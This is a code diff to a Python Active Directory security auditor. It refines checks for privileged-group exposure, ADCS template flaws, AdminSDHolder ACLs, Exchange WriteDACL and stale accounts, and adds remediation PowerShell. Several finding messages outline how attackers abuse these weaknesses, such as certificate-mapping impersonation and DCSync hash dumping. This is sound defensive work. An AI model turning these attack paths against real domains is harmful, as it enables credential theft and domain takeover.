             for m in get_list(pu["attrs"], "member"):
                 pu_members.add(m.lower())
-        # Check if all domain admin members are in Protected Users
-        da_members = self.d.priv_group_members.get("Domain Admins", [])
         not_protected = []
-        for m in da_members:
-            dn = m.get("dn", "").lower()
-            if dn and dn not in pu_members:
+        seen = set()
+        for grpname in ["Domain Admins", "Enterprise Admins", "Schema Admins"]:
+            for m in self.d.priv_group_members.get(grpname, []):
+                if not self._is_user_account(m):
+                    continue
                 sam = get_str(m["attrs"], "sAMAccountName")
-                uac = get_int(m["attrs"], "userAccountControl")
-                if not uac_has(uac, UAC_ACCOUNTDISABLE):
-                    not_protected.append(sam)
+                if sam in seen:
+                    continue
+                seen.add(sam)
+                dn = m.get("dn", "").lower()
+                if dn and dn not in pu_members:
+                    uac = get_int(m["attrs"], "userAccountControl")
+                    if not uac_has(uac, UAC_ACCOUNTDISABLE):
+                        not_protected.append(f"{sam} ({grpname})")
         if not_protected:
             self._add("A-ProtectedUsers",
-                      f"{len(not_protected)} Domain Admin account(s) are not members of "
-                      "Protected Users — they are susceptible to credential theft.",
+                      f"{len(not_protected)} privileged account(s) (DA/EA/SA) are not "
+                      "members of Protected Users — they are susceptible to credential "
+                      "theft (Mimikatz, NTLM relay, RC4 downgrade).",
                       not_protected[:20])
 
     def _a_dns_zones(self):
@@ -3919,17 +4371,24 @@ class CheckEngine:
                       [get_str(d["attrs"], "dNSHostName") for d in active_dcs])
 
     def _a_ntfrs_sysvol(self):
-        # Check msDS-NcType or FRS service registration
         frs_sets = self.d.conn.paged_search(
             self.d.cfg,
             "(objectClass=nTFRSReplicaSet)",
             ["name","distinguishedName"])
-        if frs_sets:
-            names = [get_str(f["attrs"], "name") for f in frs_sets]
-            self._add("A-NTFRSOnSysvol",
-                      "NTFRS replica sets found — SYSVOL replication may still use "
-                      "deprecated FRS instead of DFSR. This is a security and stability risk.",
-                      names)
+        if not frs_sets:
+            return
+        dfsr_sets = self.d.conn.paged_search(
+            self.d.cfg,
+            "(&(objectClass=msDFSR-ReplicationGroup)(cn=Domain System Volume))",
+            ["cn"])
+        if dfsr_sets:
+            return
+        names = [get_str(f["attrs"], "name") for f in frs_sets]
+        self._add("A-NTFRSOnSysvol",
+                  "NTFRS replica sets found and no DFSR 'Domain System Volume' replication "
+                  "group exists — SYSVOL replication is still using deprecated FRS. "
+                  "Migrate to DFSR for security and reliability.",
+                  names)
 
     def _a_adcs_cert_weakness(self):
         """Weak CA certificate crypto (PingCastle-parity): MD5/SHA-1 signatures,
@@ -4123,13 +4582,18 @@ class CheckEngine:
                           f"{cn} ... to weaponize.",
                           [f"{cn} writable by {p}" for p in esc4])
 
-            # ESC9: no security extension on an auth template (weak cert mapping)
+            # ESC9: no security extension on an auth template (weak cert mapping).
+            # Only exploitable if StrongCertificateBindingEnforcement != 2 on DCs
+            # (a registry value we can't read via LDAP). Flag the template config
+            # as the actionable finding, since the template flag is the root cause.
             if (enroll_flag & self._CT_NO_SECURITY_EXTENSION) and has_auth_eku and enroll_reachable:
                 self._add("A-CertTemplateESC9",
                           f"ESC9: Template '{cn}' sets CT_FLAG_NO_SECURITY_EXTENSION with an "
                           f"authentication EKU — the issued cert omits the SID security "
                           f"extension, so AD falls back to weak (UPN) mapping. With write access "
-                          f"to a victim's userPrincipalName this allows authenticating as them.{enroll_note}",
+                          f"to a victim's userPrincipalName this allows authenticating as them. "
+                          f"Note: exploitability depends on StrongCertificateBindingEnforcement "
+                          f"NOT being set to 2 on DCs (KB5014754).{enroll_note}",
                           [cn])
 
             # ESC15 (CVE-2024-49019): schema V1 + enrollee-supplied subject, no
@@ -4271,9 +4735,9 @@ class CheckEngine:
         except Exception:
             return []
         broad = self._broad_low_priv_sids()
-        dangerous = (self._ADS_GENERIC_ALL | self._ADS_GENERIC_WRITE
-                     | self._ADS_WRITE_DACL | self._ADS_WRITE_OWNER
-                     | self._ADS_WRITE_PROP)
+        # Full-object dangerous permissions (any ACE type)
+        full_dangerous = (self._ADS_GENERIC_ALL | self._ADS_GENERIC_WRITE
+                          | self._ADS_WRITE_DACL | self._ADS_WRITE_OWNER)
         writers: List[str] = []
         dacl = sd["Dacl"]
         if not dacl:
@@ -4286,8 +4750,16 @@ class CheckEngine:
                 sidstr = ace["Ace"]["Sid"].formatCanonical()
             except Exception:
                 continue
-            if sidstr in broad and (mask & dangerous):
+            if sidstr not in broad:
+                continue
+            if mask & full_dangerous:
                 writers.append(broad[sidstr])
+            elif mask & self._ADS_WRITE_PROP:
+                # WriteProp is only dangerous on basic ACEs (applies to ALL
+                # properties). Object ACEs with WriteProp scoped to a single
+                # property (e.g. description) are not template-takeover.
+                if ace["AceType"] == 0x00:
+                    writers.append(broad[sidstr])
         return _dedup_keep_order(writers)
 
     def _template_low_priv_enrollers(self, tmpl: Dict) -> Tuple[List[str], bool]:
@@ -4384,6 +4856,8 @@ class CheckEngine:
         except Exception:
             return []
         broad = self._broad_low_priv_sids()
+        # Only full-object takeover rights — NOT WriteProp, which on an object
+        # ACE (type 0x05) may be scoped to a single non-dangerous property.
         takeover = (self._ADS_GENERIC_ALL | self._ADS_GENERIC_WRITE
                     | self._ADS_WRITE_DACL | self._ADS_WRITE_OWNER)
         out: List[str] = []
@@ -4397,24 +4871,42 @@ class CheckEngine:
                 mask = int(ace["Ace"]["Mask"]["Mask"]); sidstr = ace["Ace"]["Sid"].formatCanonical()
             except Exception:
                 continue
-            if sidstr in broad and (mask & takeover):
+            if sidstr not in broad:
+                continue
+            # For object ACEs, GenericWrite includes WriteProp which may be
+            # scoped — only flag full takeover permissions.
+            if ace["AceType"] == 0x05:
+                if mask & (self._ADS_GENERIC_ALL | self._ADS_WRITE_DACL | self._ADS_WRITE_OWNER):
+                    out.append(broad[sidstr])
+            elif mask & takeover:
                 out.append(broad[sidstr])
         return _dedup_keep_order(out)
 
+    _BROAD_MEMBER_SIDS = {
+        "s-1-1-0":  "Everyone",
+        "s-1-5-7":  "Anonymous Logon",
+        "s-1-5-11": "Authenticated Users",
+    }
+
     def _a_member_everyone(self):
-        everyone_patterns = ["everyone","s-1-1-0","authenticated users",
-                             "s-1-5-11","anonymous","s-1-5-7"]
         for gname in self.PRIV_GROUPS_SENSITIVE:
             g = self.d.groups.get(gname.lower())
             if not g:
                 continue
             for m in get_list(g["attrs"], "member"):
                 ml = m.lower()
-                if any(p in ml for p in everyone_patterns):
+                cn = dn_base(m).lower()
+                matched_name = None
+                for sid, friendly in self._BROAD_MEMBER_SIDS.items():
+                    if cn == sid or f"cn={sid}," in ml:
+                        matched_name = friendly
+                        break
+                if matched_name:
                     self._add("A-MembershipEveryone",
-                              f"'{m}' is a member of privileged group '{gname}'. "
+                              f"'{matched_name}' (via Foreign Security Principal '{m}') "
+                              f"is a member of privileged group '{gname}'. "
                               "Any domain user (or anonymous) inherits these privileges.",
-                              [f"{m} -> {gname}"])
+                              [f"{matched_name} -> {gname}"])
 
     PRIV_GROUPS_SENSITIVE = [
         "Domain Admins","Schema Admins","Enterprise Admins","Administrators",
@@ -4492,15 +4984,63 @@ class CheckEngine:
                           "Smart-card-only accounts' NT hashes never rotate.",
                           [])
 
+    _ADMIN_SD_HOLDER_DEFAULT_SIDS = {
+        "S-1-5-18",       # SYSTEM
+        "S-1-5-32-544",   # Administrators
+        "S-1-5-32-548",   # Account Operators
+        "S-1-5-32-549",   # Server Operators
+        "S-1-5-32-551",   # Backup Operators
+        "S-1-3-0",        # CREATOR OWNER
+        "S-1-5-10",       # SELF
+        "S-1-5-9",        # Enterprise Domain Controllers
+    }
+
     def _a_admin_sd_holder(self):
-        # Orphaned adminCount=1 objects are reported (correctly labelled, and
-        # including computers/disabled) by _m_admincount_orphan -> P-AdminCountOrphan.
-        # This method used to re-emit the same population as A-AdminSDHolder at
-        # HIGH with a misleading "ACL inconsistency detected" title (it never
-        # parsed the AdminSDHolder DACL), duplicating that finding on nearly every
-        # domain. Removed to keep a single source of truth. A real AdminSDHolder
-        # DACL-diff check would go here.
-        return
+        if not HAS_IMPACKET_LDAP:
+            return
+        ash_dn = f"CN=AdminSDHolder,CN=System,{self.d.base}"
+        raw = self.d.conn.fetch_sd(ash_dn)
+        if not raw:
+            return
+        try:
+            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
+        except Exception:
+            return
+        dacl = sd["Dacl"]
+        if not dacl:
+            return
+        dsid = ""
+        if self.d.domain_obj:
+            raw_sid = self.d.domain_obj["attrs"].get("objectSid")
+            if isinstance(raw_sid, list):
+                raw_sid = raw_sid[0] if raw_sid else None
+            dsid = sid_to_str(raw_sid) if raw_sid else ""
+        default_sids = set(self._ADMIN_SD_HOLDER_DEFAULT_SIDS)
+        if dsid:
+            for rid in (512, 519, 516, 498):
+                default_sids.add(f"{dsid}-{rid}")
+        non_default = []
+        for ace in dacl["Data"]:
+            try:
+                if "DENIED" in ace["TypeName"].upper():
+                    continue
+                sid = ace["Ace"]["Sid"].formatCanonical()
+                if sid in default_sids:
+                    continue
+                mask = int(ace["Ace"]["Mask"]["Mask"])
+                write_bits = _ACE_WRITE_DAC | _ACE_WRITE_OWNER | _ACE_GENERIC_ALL | _ACE_GENERIC_WRITE | _ACE_DS_WRITE_PROP
+                if mask & write_bits:
+                    non_default.append(sid)
+            except Exception:
+                continue
+        if non_default:
+            unique = list(dict.fromkeys(non_default))
+            self._add("A-AdminSDHolder",
+                      f"{len(unique)} non-default principal(s) hold write access on "
+                      "AdminSDHolder. SDProp stamps this DACL onto every protected "
+                      "object (admins, DCs) every 60 minutes — a backdoor here persists "
+                      "across password resets.",
+                      unique[:20])
 
     def _a_pwd_gpo(self):
         if not self.d.domain_obj:
@@ -4640,9 +5180,15 @@ class CheckEngine:
                       names[:30])
         # Check for admins that have never logged in (reconciled across DCs when
         # --accurate-logon, so a DA who only logs on to one DC isn't a false hit).
+        # Skip accounts created <30 days ago — a newly provisioned DA legitimately
+        # hasn't logged on yet.
         never_logon = []
         for m in active_admins:
             if self._reconciled_logon_age(m) is None:
+                wc = m["attrs"].get("whenCreated")
+                create_age = self._when_created_age(wc)
+                if create_age is not None and create_age <= 30:
+                    continue
                 never_logon.append(get_str(m["attrs"], "sAMAccountName"))
         if never_logon:
             self._add("P-AdminLogin",
@@ -4673,10 +5219,14 @@ class CheckEngine:
         for sam, (grpname, m) in members.items():
             if uac_has(get_int(m["attrs"], "userAccountControl"), UAC_ACCOUNTDISABLE):
                 continue
-            age = days_since(filetime_to_dt(get_int(m["attrs"], "pwdLastSet")))
-            if age is None or age > 90:
-                age_str = f"{age} days" if age is not None else "NEVER"
-                affected.append(f"{sam} ({grpname}): password last set {age_str} ago")
+            pls_raw = get_int(m["attrs"], "pwdLastSet")
+            # pwdLastSet=0 means "must change at next logon" — not "never changed".
+            # Flagging it as stale is a false positive; the admin is already prompted.
+            if pls_raw == 0:
+                continue
+            age = days_since(filetime_to_dt(pls_raw))
+            if age is not None and age > 90:
+                affected.append(f"{sam} ({grpname}): password last set {age} days ago")
         if affected:
             self._add("P-AdminPwdTooOld",
                       f"{len(affected)} privileged account(s) have a password older "
@@ -4699,6 +5249,11 @@ class CheckEngine:
                 if sam in seen:
                     continue
                 age = self._reconciled_logon_age(m)
+                if age is None:
+                    wc = m["attrs"].get("whenCreated")
+                    create_age = self._when_created_age(wc)
+                    if create_age is not None and create_age <= 30:
+                        continue
                 if age is None or age > 180:
                     seen.add(sam)
                     age_str = f"{age} days" if age is not None else "NEVER"
@@ -4851,14 +5406,53 @@ class CheckEngine:
                       active[:20])
 
     def _p_exchange_priv_esc(self):
-        # Check for Exchange Windows Permissions having WriteDACL on domain root
-        # This is the classic Exchange PrivEsc (CVE-2019-0686 style)
+        # Only fire when Exchange Windows Permissions actually holds WriteDACL on the
+        # domain root (the classic CVE-2019-0686 escalation). Merely having members in
+        # the group is normal for any Exchange deployment — firing on that alone was a
+        # false CRITICAL on every Exchange org.
         ewp = self.d.priv_group_members.get("Exchange Windows Permissions", [])
-        if ewp:
+        if not ewp:
+            return
+        ewp_has_writedacl = False
+        for f in self.d.acl_findings:
+            if (f.get("object") == "Domain Root"
+                    and f.get("type") in ("dangerous_acl", "write_property")
+                    and "exchange" in f.get("sid_name", "").lower()):
+                ewp_has_writedacl = True
+                break
+        if not ewp_has_writedacl and HAS_IMPACKET_LDAP:
+            # Direct check: look up the EWP group SID and test for WriteDACL on domain root
+            ewp_grp = self.d.groups.get("exchange windows permissions")
+            if ewp_grp:
+                ewp_sid = sid_to_str(ewp_grp["attrs"].get("objectSid"))
+                if isinstance(ewp_grp["attrs"].get("objectSid"), list):
+                    ewp_sid = sid_to_str(ewp_grp["attrs"]["objectSid"][0])
+                if ewp_sid:
+                    try:
+                        raw_sd = self.d.conn.fetch_sd(self.d.base)
+                        if raw_sd:
+                            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
+                            dacl = sd["Dacl"]
+                            if dacl:
+                                for ace in dacl["Data"]:
+                                    try:
+                                        if "DENIED" in ace["TypeName"].upper():
+                                            continue
+                                        mask = int(ace["Ace"]["Mask"]["Mask"])
+                                        sid = ace["Ace"]["Sid"].formatCanonical()
+                                        if sid == ewp_sid and (mask & _ACE_WRITE_DAC):
+                                            ewp_has_writedacl = True
+                                            break
+                                    except Exception:
+                                        continue
+                    except Exception:
+                        pass
+        if ewp_has_writedacl:
             self._add("P-ExchangePrivEsc",
-                      f"'Exchange Windows Permissions' group has {len(ewp)} member(s). "
-                      "If this group has WriteDACL on the domain object, DCSync is possible. "
-                      "Verify ACL on domain root.",
+                      f"'Exchange Windows Permissions' group ({len(ewp)} member(s)) holds "
+                      "WriteDACL on the domain root — any group member can grant themselves "
+                      "DCSync rights (DS-Replication-Get-Changes-All) and dump all password "
+                      "hashes. This is CVE-2019-0686. Remove WriteDACL from the domain root ACL.",
                       [get_str(m["attrs"],"sAMAccountName") for m in ewp[:10]])
 
     def _p_delegations(self):
@@ -4968,6 +5562,7 @@ class CheckEngine:
     def _s_inactive_users(self):
         threshold = 180
         inactive = []
+        never_logon = []
         for u in self.d.users:
             uac = get_int(u["attrs"], "userAccountControl")
             if uac_has(uac, UAC_ACCOUNTDISABLE):
@@ -4976,18 +5571,28 @@ class CheckEngine:
                 continue
             llt = filetime_to_dt(get_int(u["attrs"], "lastLogonTimestamp"))
             age = days_since(llt)
-            if age is None or age > threshold:
-                sam = get_str(u["attrs"], "sAMAccountName")
-                age_str = f"{age}d" if age is not None else "never"
-                inactive.append(f"{sam} ({age_str})")
-        if inactive:
+            sam = get_str(u["attrs"], "sAMAccountName")
+            if age is None:
+                # Never-logged-on: only flag if the account was created >30 days ago
+                # (newly-provisioned accounts legitimately have no logon yet).
+                wc = u["attrs"].get("whenCreated")
+                create_age = self._when_created_age(wc)
+                if create_age is not None and create_age > 30:
+                    never_logon.append(f"{sam} (never logged on, created {create_age}d ago)")
+            elif age > threshold:
+                inactive.append(f"{sam} ({age}d)")
+        combined = inactive + never_logon
+        if combined:
             self._add("S-Inactive",
-                      f"{len(inactive)} enabled user account(s) have not logged in for "
-                      f">{threshold} days.",
-                      inactive[:30])
+                      f"{len(combined)} enabled user account(s) are stale: "
+                      f"{len(inactive)} inactive >{threshold} days, "
+                      f"{len(never_logon)} never logged on (created >30 days ago).",
+                      combined[:30])
 
     def _s_inactive_computers(self):
-        threshold = 45
+        # 90-day threshold accounts for lastLogonTimestamp's 14-day replication
+        # jitter and avoids flagging machines that are simply off for a few weeks.
+        threshold = 90
         inactive = []
         for comp in self.d.computers:
             uac = get_int(comp["attrs"], "userAccountControl")
@@ -4997,13 +5602,21 @@ class CheckEngine:
                 continue  # DCs handled separately
             llt = filetime_to_dt(get_int(comp["attrs"], "lastLogonTimestamp"))
             age = days_since(llt)
-            if age is None or age > threshold:
-                name = get_str(comp["attrs"], "sAMAccountName")
-                inactive.append(name)
+            if age is None:
+                # Never authenticated: only count if created >30 days ago
+                wc = comp["attrs"].get("whenCreated")
+                create_age = self._when_created_age(wc)
+                if create_age is None or create_age <= 30:
+                    continue
+            elif age <= threshold:
+                continue
+            name = get_str(comp["attrs"], "sAMAccountName")
+            age_str = f"{age}d" if age is not None else "never"
+            inactive.append(f"{name} ({age_str})")
         if inactive:
             self._add("S-C-Inactive",
                       f"{len(inactive)} computer account(s) have not authenticated in "
-                      f">{threshold} days.",
+                      f">{threshold} days (or never, if created >30d ago).",
                       inactive[:30])
 
     def _s_inactive_dcs(self):
@@ -5051,16 +5664,23 @@ class CheckEngine:
 
     def _s_pwd_never_expires(self):
         affected = []
+        wellknown_skip = {"krbtgt", "defaultaccount", "guest"}
         for u in self.d.users:
             uac = get_int(u["attrs"], "userAccountControl")
             if uac_has(uac, UAC_ACCOUNTDISABLE):
                 continue
             if uac_has(uac, UAC_DONT_EXPIRE_PASSWORD):
                 sam = get_str(u["attrs"], "sAMAccountName")
+                if sam.lower() in wellknown_skip:
+                    continue
+                if sam.upper().startswith("MSOL_"):
+                    continue
                 affected.append(sam)
         if affected:
             self._add("S-PwdNeverExpires",
-                      f"{len(affected)} enabled account(s) have 'Password Never Expires' set.",
+                      f"{len(affected)} enabled account(s) have 'Password Never Expires' set. "
+                      "These accounts' credentials never age out — compromised hashes remain "
+                      "valid indefinitely. Review and apply a PSO or rotation policy.",
                       affected[:30])
 
     def _s_pwd_not_required(self):
@@ -5224,7 +5844,7 @@ class CheckEngine:
                       [label])
 
     def _s_old_os(self):
-        xp_hosts, vista_hosts, nt_hosts, w10_eol = [], [], [], []
+        xp_hosts, vista_hosts, nt_hosts, w10_eol, svr2012 = [], [], [], [], []
         for comp in self.d.computers:
             uac = get_int(comp["attrs"], "userAccountControl")
             if uac_has(uac, UAC_ACCOUNTDISABLE):
@@ -5239,11 +5859,12 @@ class CheckEngine:
                 xp_hosts.append(name)
             elif any(x in os_str for x in ["vista","2008","server 2008"]):
                 vista_hosts.append(name)
+            elif any(x in os_str for x in ["server 2012"]):
+                svr2012.append(name)
             elif "windows 10" in os_str:
-                # Rough EOL check on build number
                 try:
                     build = int(os_ver.split("(")[1].rstrip(")")) if "(" in os_ver else 0
-                    if build < 19044:  # earlier than 21H2 (still broadly used threshold)
+                    if build < 19044:
                         w10_eol.append(f"{name} (build {build})")
                 except Exception:
                     pass
@@ -5255,6 +5876,11 @@ class CheckEngine:
         if vista_hosts:
             self._add("S-OS-Vista", f"{len(vista_hosts)} Windows Vista/Server 2008 system(s).",
                       vista_hosts[:20])
+        if svr2012:
+            self._add("S-OS-2012",
+                      f"{len(svr2012)} Windows Server 2012/2012 R2 system(s) — EOL Oct 2023, "
+                      "no further security updates. Upgrade or isolate.",
+                      svr2012[:20])
         if w10_eol:
             self._add("S-OS-W10", f"{len(w10_eol)} EOL Windows 10 build(s) detected.",
                       w10_eol[:20])
@@ -5414,7 +6040,10 @@ class CheckEngine:
         ttype = get_int(trust["attrs"], "trustType")
         wc    = trust["attrs"].get("whenChanged")
 
-        # Inactive trust
+        # Inactive trust — whenChanged reflects AD object modification, not actual
+        # trust usage (authentication traffic). A stable, actively-used trust that
+        # hasn't been reconfigured will have an old whenChanged. Use a conservative
+        # threshold and advisory wording.
         if wc:
             try:
                 wc_dt = None
@@ -5426,9 +6055,13 @@ class CheckEngine:
                     wc_dt = datetime.datetime.fromisoformat(wc.replace("Z","+00:00"))
                 if wc_dt:
                     age = days_since(wc_dt)
-                    if age is not None and age > 365:
+                    if age is not None and age > 730:
                         self._add("T-Inactive",
-                                  f"Trust with '{name}' has not been modified in {age} days.",
+                                  f"Trust object for '{name}' has not been modified in "
+                                  f"{age} days. This MAY indicate a stale trust — verify "
+                                  "with authentication logs. Note: whenChanged reflects "
+                                  "object edits, not trust usage; a stable trust can "
+                                  "appear inactive by this metric.",
                                   [name])
             except Exception:
                 pass
@@ -5649,6 +6282,16 @@ class CheckEngine:
                     and entry["key"].lower() == key.lower()):
                 return entry["value"]
         return None
+
+    def _get_inf_section(self, section: str) -> List[Dict]:
+        """Return all inf_settings entries for a given section (e.g. 'Privilege Rights')."""
+        out = []
+        for entry in self.d.sysvol_data.get("inf_settings", []):
+            if not self._sysvol_entry_effective(entry):
+                continue
+            if entry["section"].lower() == section.lower():
+                out.append(entry)
+        return out
 
     # ── GPP passwords ─────────────────────────────────────────────────────────
 
@@ -7348,6 +7991,9 @@ EXPOSURE_WEIGHTS = {
     "P-ControlPathDA":92, "P-ControlPathIndirectEveryone":95, "P-ControlPathIndirectMany":70,
     "A-SCCMContainerACL":75, "P-GMSAReadable":88, "A-KDSRootKey":90,
     "A-AADConnectSync":70, "A-SeamlessSSO":60,
+    "P-ForeignPriv":82, "P-DelegationDCrbcd":88, "A-TombstoneLifetime":30,
+    "P-OperatorsMember":72, "P-GpoNonAdminOwner":80, "P-DangerousUserRight":90,
+    "P-LoginDCEveryone":85,
 }
 
 # rule_id -> (mode, weight). mode 'flat' adds weight; mode 'pct_users'/'pct_comps'
@@ -7359,7 +8005,7 @@ HYGIENE_WEIGHTS = {
     "S-C-Inactive":("pct_comps",14), "S-C-PrimaryGroup":("pct_comps",4),
     "A-LAPS-Not-Installed":("flat",12), "A-LAPS-Joined-Computers":("pct_comps",8),
     "A-LocalAdminPassword":("flat",12), "S-OS-NT":("flat",14), "S-OS-XP":("flat",12),
-    "S-OS-Vista":("flat",8), "S-OS-W10":("flat",4), "S-SMB-v1":("flat",10),
+    "S-OS-Vista":("flat",8), "S-OS-2012":("flat",6), "S-OS-W10":("flat",4), "S-SMB-v1":("flat",10),
     "A-MinPwdLen":("flat",8), "A-PwdComplexity":("flat",6), "A-PwdHistory":("flat",3),
     "A-PwdMaxAge":("flat",3), "A-Krbtgt":("flat",8), "A-DCLdapSign":("flat",6),
     "A-SMB2SignatureNotRequired":("flat",6), "A-SMB2SignatureNotEnabled":("flat",8),
@@ -7600,6 +8246,10 @@ RULE_MITIGATION = {
     "S-OS-Vista":["M1051","M1042"], "S-OS-NT":["M1051","M1042"],
     "S-FunctionalLevel1":["M1051"], "S-FunctionalLevel3":["M1051"],
     "P-ExchangePrivEsc":["M1026","M1015"], "P-DNSAdmin":["M1026","M1018"],
+    "P-OperatorsMember":["M1026","M1018"], "P-DangerousUserRight":["M1026","M1015"],
+    "P-GpoNonAdminOwner":["M1026","M1015"], "P-LoginDCEveryone":["M1026","M1035"],
+    "P-ForeignPriv":["M1026","M1015"], "A-TombstoneLifetime":["M1015"],
+    "P-DelegationDCrbcd":["M1015","M1026"], "S-OS-2012":["M1051","M1042"],
 }
 # Human-readable expansion for the framework chips' tooltips.
 MITIGATION_NAME = {
@@ -7648,6 +8298,10 @@ RULE_STIG = {
     "S-OS-NT": "Win STIG: unsupported OS removed",
     "P-ProtectedUsers": "AD STIG: privileged accounts in Protected Users",
     "P-LAPSReadable": "Win STIG: local admin password read access restricted (LAPS)",
+    "P-OperatorsMember": "AD STIG: operator groups (Backup/Server/Account/Print) empty",
+    "S-OS-2012": "Win STIG: unsupported OS removed",
+    "P-GpoNonAdminOwner": "AD STIG: GPO ownership restricted to admins",
+    "P-DangerousUserRight": "Win STIG: user rights assignment hardened",
 }
 
 # Copy-able PowerShell / ADUC remediation, one entry per rule. {domain} / {dc}
@@ -7682,6 +8336,14 @@ RULE_POWERSHELL = {
     "P-LAPSReadable": ["# Re-scope LAPS read rights to admins only, then force rotation:",
                        "Find-LapsADExtendedRights -Identity 'OU=Computers,DC=...'",
                        "Reset-LapsPassword -Identity <computer>"],
+    "P-GpoNonAdminOwner": ["# Set ownership of all GPOs to Domain Admins:",
+                          "Get-GPO -All | ForEach-Object { dsacls (Get-GPO $_.DisplayName).Path /setowner 'DOMAIN\\Domain Admins' }"],
+    "P-OperatorsMember": ["# List and remove members from each operator group:",
+                          "Get-ADGroupMember 'Account Operators' -Server {domain}",
+                          "Get-ADGroupMember 'Server Operators' -Server {domain}",
+                          "Get-ADGroupMember 'Backup Operators' -Server {domain}",
+                          "Get-ADGroupMember 'Print Operators' -Server {domain}",
+                          "Remove-ADGroupMember '<OperatorGroup>' -Members '<user>' -Server {domain} -Confirm:$false"],
 }
 
 def rule_compliance(rule_id: str, opcat: str) -> Dict[str, List[str]]:
